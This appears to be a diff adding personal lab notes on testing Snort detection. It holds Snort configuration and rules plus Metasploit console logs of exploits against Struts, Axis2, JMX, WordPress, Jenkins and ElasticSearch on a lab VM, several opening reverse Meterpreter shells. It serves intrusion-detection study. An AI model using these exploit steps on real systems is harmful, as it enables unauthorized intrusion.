@@ -1,0 +1,204 @@
+Changed the network interface in the VM to bridged mode from NAT to be able to attack using the same computer. TBA explain why.
+
+Install & configure snort:
+https://www.youtube.com/watch?v=l2w-fbyy6y0
+
+Including port scan:
+https://www.youtube.com/watch?v=wXFVLXIsZdA
+
+Port scan
+modify snort.conf portscan as described in the second link above:
+# Portscan detection.  For more information, see README.sfportscan
+preprocessor sfportscan:\
+	proto  { all } \
+	scan_type { portscan } \
+	sense_level { medium }
+
+=> After this port scan with nmap or with portscanner written during the course is detected.
+
+SSH brute force login by password scan:
+Detected after uncommenting this rule in indicator_scan.rules
+alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"INDICATOR-SCAN SSH brute force login attempt"; flow:to_server,established,no_stream; content:"SSH-"; depth:4; detection_filter:track by_src, count 5, seconds 60; metadata:policy max-detect-ips drop, service ssh; reference:cve,2012-6066; reference:cve,2015-5600; classtype:misc-activity; sid:19559; rev:9;)
+
+
+Failed (possibly not vulnerable):
+msf exploit(multi/http/struts_dev_mode) > exploit
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] Exploit completed, but no session was created.
+msf exploit(multi/http/struts_dev_mode) > 
+
+This was not logged as alert but seen in console log output as attempt to execute remote code.
+
+
+Successful exploit on Apache Struts (CVE-2016-3087):
+Not detected by snort.
+msf exploit(multi/http/struts_dmi_rest_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] 192.168.5.186:8282 - Uploading exploit to vT4GRLV.jar, and executing it.
+[*] Sending stage (53859 bytes) to 192.168.5.186
+[*] Meterpreter session 1 opened (192.168.5.122:4444 -> 192.168.5.186:54735) at 2018-03-03 19:21:22 +0200
+
+meterpreter > 
+
+Gained administrator access to the remote machine.
+
+
+Failed exploit (possibly CVE-2009-4189??):
+Snort detected:
+03/04-07:54:48.908415  [**] [1:1201:13] INDICATOR-COMPROMISE 403 Forbidden [**]
+[Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.5.186:8
+020 -> 192.168.5.122:49912
+msf exploit(windows/http/hp_imc_mibfileupload) > exploit
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] Uploading the JSP payload...
+[-] Exploit aborted due to failure: unknown: 192.168.5.186:8282 - JSP payload upload failed
+[*] Exploit completed, but no session was created.
+msf exploit(windows/http/hp_imc_mibfileupload) > 
+
+
+Detected exploit on ManageEngine (CVE-2015-8249)
+exploit/windows/http/manageengine_connectionid_write
+
+03/04-07:58:53.089315  [**] [1:1054:14] SERVER-WEBAPP weblogic/tomcat .jsp view
+source attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP}
+ 192.168.5.122:50440 -> 192.168.5.186:8020
+
+
+Successful exploit on Axis2 (CVE-2010-0219):
+No reaction from Snort.
+
+msf exploit(multi/http/axis2_deployer) > exploit
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[+] http://192.168.5.186:8282/axis2/axis2-admin [Apache-Coyote/1.1] [Axis2 Web Admin Module] successful login 'admin' : 'axis2'
+[+] Successfully uploaded
+[*] Polling to see if the service is ready
+[*] Sending stage (53859 bytes) to 192.168.5.186
+[*] Meterpreter session 4 opened (192.168.5.122:4444 -> 192.168.5.186:56016) at 2018-03-03 19:55:37 +0200
+[+] Deleted webapps/axis2/WEB-INF/services/yeJDeLau.jar
+
+meterpreter > 
+
+Successful exploit on JMX (CVE-2015-2342);
+No reaction from Snort.
+
+msf exploit(multi/misc/java_jmx_server) > exploit
+[*] Exploit running as background job 1.
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+msf exploit(multi/misc/java_jmx_server) > [*] 192.168.5.186:1617 - Using URL: http://0.0.0.0:8080/ZQpYnsj1HsUm4
+[*] 192.168.5.186:1617 - Local IP: http://192.168.5.122:8080/ZQpYnsj1HsUm4
+[*] 192.168.5.186:1617 - Sending RMI Header...
+[*] 192.168.5.186:1617 - Discovering the JMXRMI endpoint...
+[+] 192.168.5.186:1617 - JMXRMI endpoint on 172.28.128.3:49177
+[*] 192.168.5.186:1617 - Proceeding with handshake...
+[+] 192.168.5.186:1617 - Handshake with J MX MBean server on 172.28.128.3:49177
+[*] 192.168.5.186:1617 - Loading payload...
+[*] 192.168.5.186:1617 - Replied to request for mlet
+[*] 192.168.5.186:1617 - Executing payload...
+[*] Sending stage (53859 bytes) to 192.168.5.186
+[*] Meterpreter session 6 opened (192.168.5.122:4444 -> 192.168.5.186:56466) at 2018-03-03 20:07:37 +0200
+
+
+Successful exploit on Wordpress (CVE-2013-3238):
+
+msf exploit(multi/http/wp_ninja_forms_unauthenticated_file_upload) > set FORM_PATH /index.php/king-of-hearts/
+FORM_PATH => /index.php/king-of-hearts/
+msf exploit(multi/http/wp_ninja_forms_unauthenticated_file_upload) > exploit
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] 192.168.5.186:8585 - Enabling vulnerable V3 functionality...
+[*] 192.168.5.186:8585 - Preparing payload...
+[*] 192.168.5.186:8585 - Uploading payload to /wordpress/wp-content/uploads/nftmp-lmbgcuoecf.php
+[*] 192.168.5.186:8585 - Executing the payload...
+[*] Sending stage (37543 bytes) to 192.168.5.186
+[*] Meterpreter session 7 opened (192.168.5.122:4444 -> 192.168.5.186:58501) at 2018-03-03 20:56:37 +0200
+[+] 192.168.5.186:8585 - Deleted nftmp-lmbgcuoecf.php
+[+] 192.168.5.186:8585 - Executed payload
+[*] 192.168.5.186:8585 - Disabling vulnerable V3 functionality...
+
+meterpreter > 
+
+
+Jenkins not detected:
+
+msf exploit(multi/http/jenkins_script_console) > run
+[*] Exploit running as background job 2.
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] Checking access to the script console
+msf exploit(multi/http/jenkins_script_console) > [*] No authentication required, skipping login...
+[*] 192.168.5.186:8484 - Sending command stager...
+[*] Command Stager progress -   2.06% done (2048/99626 bytes)
+[*] Command Stager progress -   4.11% done (4096/99626 bytes)
+[*] Command Stager progress -   6.17% done (6144/99626 bytes)
+[*] Command Stager progress -   8.22% done (8192/99626 bytes)
+[*] Command Stager progress -  10.28% done (10240/99626 bytes)
+[*] Command Stager progress -  12.33% done (12288/99626 bytes)
+[*] Command Stager progress -  14.39% done (14336/99626 bytes)
+[*] Command Stager progress -  16.45% done (16384/99626 bytes)
+[*] Command Stager progress -  18.50% done (18432/99626 bytes)
+[*] Command Stager progress -  20.56% done (20480/99626 bytes)
+[*] Command Stager progress -  22.61% done (22528/99626 bytes)
+[*] Command Stager progress -  24.67% done (24576/99626 bytes)
+[*] Command Stager progress -  26.72% done (26624/99626 bytes)
+[*] Command Stager progress -  28.78% done (28672/99626 bytes)
+[*] Command Stager progress -  30.84% done (30720/99626 bytes)
+[*] Command Stager progress -  32.89% done (32768/99626 bytes)
+[*] Command Stager progress -  34.95% done (34816/99626 bytes)
+[*] Command Stager progress -  37.00% done (36864/99626 bytes)
+[*] Command Stager progress -  39.06% done (38912/99626 bytes)
+[*] Command Stager progress -  41.11% done (40960/99626 bytes)
+[*] Command Stager progress -  43.17% done (43008/99626 bytes)
+[*] Command Stager progress -  45.23% done (45056/99626 bytes)
+[*] Command Stager progress -  47.28% done (47104/99626 bytes)
+[*] Command Stager progress -  49.34% done (49152/99626 bytes)
+[*] Command Stager progress -  51.39% done (51200/99626 bytes)
+[*] Command Stager progress -  53.45% done (53248/99626 bytes)
+[*] Command Stager progress -  55.50% done (55296/99626 bytes)
+[*] Command Stager progress -  57.56% done (57344/99626 bytes)
+[*] Command Stager progress -  59.61% done (59392/99626 bytes)
+[*] Command Stager progress -  61.67% done (61440/99626 bytes)
+[*] Command Stager progress -  63.73% done (63488/99626 bytes)
+[*] Command Stager progress -  65.78% done (65536/99626 bytes)
+[*] Command Stager progress -  67.84% done (67584/99626 bytes)
+[*] Command Stager progress -  69.89% done (69632/99626 bytes)
+[*] Command Stager progress -  71.95% done (71680/99626 bytes)
+[*] Command Stager progress -  74.00% done (73728/99626 bytes)
+[*] Command Stager progress -  76.06% done (75776/99626 bytes)
+[*] Command Stager progress -  78.12% done (77824/99626 bytes)
+[*] Command Stager progress -  80.17% done (79872/99626 bytes)
+[*] Command Stager progress -  82.23% done (81920/99626 bytes)
+[*] Command Stager progress -  84.28% done (83968/99626 bytes)
+[*] Command Stager progress -  86.34% done (86016/99626 bytes)
+[*] Command Stager progress -  88.39% done (88064/99626 bytes)
+[*] Command Stager progress -  90.45% done (90112/99626 bytes)
+[*] Command Stager progress -  92.51% done (92160/99626 bytes)
+[*] Command Stager progress -  94.56% done (94208/99626 bytes)
+[*] Command Stager progress -  96.62% done (96256/99626 bytes)
+[*] Command Stager progress -  98.67% done (98304/99626 bytes)
+[*] Sending stage (179779 bytes) to 192.168.5.186
+[*] Command Stager progress - 100.00% done (99626/99626 bytes)
+
+msf exploit(multi/http/jenkins_script_console) > back
+
+
+
+ElasticSearch attack success:
+msf exploit(multi/elasticsearch/script_mvel_rce) > run
+
+[*] Started reverse TCP handler on 192.168.5.122:4444 
+[*] Trying to execute arbitrary Java...
+[*] Discovering remote OS...
+[+] Remote OS is 'Windows Server 2008 R2'
+[*] Discovering TEMP path
+[+] TEMP path identified: 'C:\Windows\TEMP\'
+[*] Sending stage (53859 bytes) to 192.168.5.186
+[*] Meterpreter session 21 opened (192.168.5.122:4444 -> 192.168.5.186:52309) at 2018-03-04 22:25:13 +0200
+[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\mNNyF.jar' on the target
+
+meterpreter > 
+
